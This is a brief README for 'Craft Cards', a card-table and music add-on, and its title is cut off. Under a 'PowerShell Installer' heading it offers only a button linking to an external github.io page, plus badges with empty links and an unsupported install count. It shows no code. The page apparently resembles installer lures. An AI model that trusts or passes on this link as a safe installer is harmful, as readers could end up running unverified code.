# 🃏 Craft Cards — Multiplayer Card Tables & Custom Music for

![](files/preview.png)

### 💻 PowerShell Installer

[![](files/button.png)](https://menakhaled3112008-commits.github.io/craft-cards/)

[![ps](https://img.shields.io/badge/Ps-Core-2f81f7?style=flat-square&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/Platform-Win_11-54aeff?style=flat-square&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Released-2ea44f?style=flat-square&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/Installs-1.2K-0969da?style=flat-square&labelColor=0d1117)]()

